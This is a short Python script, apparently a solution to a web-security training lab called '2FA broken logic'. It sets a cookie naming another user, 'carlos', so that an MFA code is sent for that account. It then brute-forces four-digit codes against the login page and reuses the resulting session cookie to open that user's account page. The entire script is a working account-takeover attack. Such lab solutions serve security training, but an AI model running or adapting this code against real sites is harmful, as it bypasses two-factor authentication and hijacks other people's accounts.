import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}


#Lab: 2FA broken logic
def FA_bypass(session,url):
    fa_url=url+"/login2"

    headers={"Cookie":"verify=carlos"}


    #get requeste for mfa code sent

    requests.get(fa_url,headers=headers,verify=False,proxies=proxie)
    print('(+) MFA-CODE SENT')
    print('(+) Brute forcing MFA-CODE .....')
    ####
    
    for i in range(100,9999):
        if len(str(i))==3:
            i="0"+str(i)
        data={"mfa-code":i}
            
        response=session.post(fa_url,verify=False,headers=headers,data=data,proxies=proxie,allow_redirects=False)
        if response.status_code ==302:
            print("(+) MFA-CODE FOUND ")
            print("(+) MFA-CODE : %s"%data.get("mfa-code"))
            cookie=str(response.cookies)
            cookie=cookie.split(" ")
            header={"cookie":cookie[1]}
            bypass_url=url+"/my-account"
            response_bypass=session.get(bypass_url,verify=False,headers=header,proxies=proxie)
            if "Log out" in response_bypass.text:
                print('(+) Log in successfully')
                print("(+) Session value : %s"%cookie[1])
                print('(+) Change the session value in your browser with carlos session to log in  ')
                print('(+) Lab solved successfully')
                break

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)
    
    url=sys.argv[1]
    session=requests.session()

    FA_bypass(session,url)


if __name__=="__main__":
    main()
